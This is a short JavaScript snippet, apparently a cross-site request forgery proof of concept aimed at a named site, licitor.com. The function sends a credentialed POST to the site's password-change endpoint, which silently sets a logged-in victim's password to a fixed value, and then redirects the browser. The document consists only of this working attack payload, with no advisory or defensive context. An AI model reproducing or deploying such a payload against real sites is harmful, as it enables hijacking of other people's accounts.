function loadCSRF() {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "https://private.licitor.com/private/val/password.php?A=CHOOSE&_window=main", false);
  xhttp.withCredentials=true;
  xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
<!-- xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest"); -->
  var params ="priv_pwd=coucou2&priv_pwd2=coucou2";
  xhttp.send(params);
  window.location = "www.licitor.com";
}
